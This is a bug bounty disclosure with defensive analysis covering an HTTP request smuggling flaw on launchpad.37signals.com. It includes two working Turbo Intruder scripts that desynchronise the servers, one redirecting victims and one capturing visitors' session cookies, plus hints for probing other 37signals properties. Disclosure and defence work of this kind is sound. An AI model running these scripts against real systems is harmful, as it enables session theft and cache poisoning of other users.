# Unauthenticated Request Smuggling on launchpad.37signals.com

## Metadata
- **Source:** HackerOne
- **Report:** 867577 | https://hackerone.com/reports/867577
- **Submitted:** 2020-05-07
- **Reporter:** hazimaslam
- **Program:** 37signals
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** HTTP Request Smuggling, Cache Poisoning, Session Fixation, Cookie Theft
- **CVEs:** None
- **Category:** uncategorised

## Summary
An HTTP request smuggling vulnerability exists on launchpad.37signals.com due to conflicting interpretations of Content-Length and Transfer-Encoding headers between frontend and backend servers. An attacker can desynchronize the servers and poison the connection, causing crafted responses to be served to legitimate users and stealing authentication cookies.

## Attack scenario
1. Attacker crafts a malicious HTTP request with Content-Length header, a valid Transfer-Encoding: chunked header, and an invalid Transfer-Encoding: foo header
2. Frontend server prioritizes the invalid Transfer-Encoding header and falls back to Content-Length interpretation
3. Backend server prioritizes the valid Transfer-Encoding: chunked header and ignores Content-Length, creating desynchronization
4. Attacker's injected payload (e.g., POST request with malicious form data) is processed by backend but not properly isolated
5. Subsequent legitimate user requests are pipelined on the same connection and receive the attacker's crafted response
6. Attacker captures victim authentication cookies, session tokens, and sensitive headers from stored/echoed responses

## Root cause
Differing HTTP specification compliance between frontend (nginx/load balancer) and backend (Rails) servers in handling multiple Transfer-Encoding headers. Frontend uses last (invalid) header value while backend uses first (valid) header value, causing request boundary desynchronization. No validation of header conflicts or strict RFC compliance enforcement.

## Attacker mindset
Target application-level request handling inconsistencies between infrastructure layers. Exploit header parsing differences to bypass frontend security controls and inject malicious requests that execute on backend. Leverage connection pooling/keep-alive to poison subsequent user sessions with stored malicious responses containing credential harvesting payloads.

## Defensive takeaways
- Implement strict HTTP/1.1 RFC 7230 compliance: reject requests with conflicting Content-Length and Transfer-Encoding headers
- Configure frontend and backend servers with identical and conservative header parsing rules (e.g., reject multiple Transfer-Encoding headers)
- Disable HTTP keep-alive or implement per-request connection isolation to prevent cross-request contamination
- Normalize and validate all header inputs at ingress before backend processing
- Implement request smuggling detection via header anomaly analysis and request/response correlation logging
- Use HTTP/2 exclusively where possible (no ambiguous header semantics)
- Apply WAF rules to detect and block suspicious header combinations (Content-Length + multiple Transfer-Encoding)
- Conduct regular security assessments specifically targeting request parsing edge cases and server desynchronization scenarios

## Variant hunting
Test for similar desynchronization on other 37signals properties (Basecamp, HEY, etc.)
Probe for alternative header conflict patterns: Content-Length vs Transfer-Encoding: identity, or chunked encoding format mismatches
Investigate whether other request methods (PUT, PATCH, DELETE) exhibit similar smuggling behavior
Test for front-end/back-end desync with different whitespace/case variations in header names
Check if response smuggling is possible by injecting malicious response headers through backend exploitation
Examine whether query string or URL encoding differences between layers can amplify the attack
Test connection reuse across different application endpoints to maximize cache poisoning scope

## MITRE ATT&CK
- T1190
- T1498
- T1021
- T1555
- T1005

## Notes
This is a classic HTTP request smuggling attack exploiting RFC ambiguity and infrastructure inconsistency. The vulnerability allows unauthenticated attackers to steal authenticated user sessions and inject malicious content. The attack was demonstrated using Turbo Intruder tool. The second variant shows session cookie exfiltration through stored XSS-like behavior. Impact is severe: credential theft, cache poisoning, and potential account takeover. Requires network-level access but no authentication, making it high-risk.

## Full report
<details><summary>Expand</summary>

## Description

By sending an ambiguous request on the rails application on `launchpad.37signals.com`, an attacker can desynchronise frontend and backend servers, leaving the socket to the backend server poisoned with a harmful response. This response will then be served up to the next visitor.

The desync occurs when sending a request with a `Content-Length` header and a valid `Transfer-Encoding` header followed by an invalid `Transfer-Encoding` header. The frontend server only examines the second `Transfer-Encoding` which is invalid, so it uses the `Content-Length` instead. However the backend server prioritises the valid `Transfer-Encoding` header and therefore ignores the `Content-Length`.

## Validation Steps

To replicate this bug, run the following script in Turbo Intruder. After issuing a desync request, it simulates 6 requests from normal visitors one of which gets redirected to `hazimaslam.com`.

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 69
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com
Foo: bar'''

    engine.queue(attack)

    victim = '''GET /signin HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,la;q=0.8
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D

'''
    for i in range(6):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```

{F818615}

### Capturing and storing normal visitors' request headers and cookies

By prefixing the victim's request with a crafted storage request, we can make the application save their request and display it back to us and steal any authentication cookies/headers.

1. Login and visit https://launchpad.37signals.com/identity/edit
2. Save changes and intercept the request.
3. Copy the values of following from intercepted request and paste in the script where indicated:

- identity_id (cookie)
- session_token (cookie)
- _launchpad_session (cookie)
- authenticity_token (parameter)


```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 903
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE

_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d='''

    engine.queue(attack)

    victim = '''GET /signin HTTP/1.1
Host: launchpad.37signals.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D
Foo: bar

'''
    for i in range(6):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```
Run the script in Turbo Intruder and refresh https://launchpad.37signals.com/identity/edit to see captured headers and cookies.

Here is the video demonstration for this:

{F818731}

## Impact

- With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.

- By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.

- It is also possible to capture visitors' request headers and cookies.

- No authentication and interaction required.

</details>

---
*Analysed by Claude on 2026-05-24*
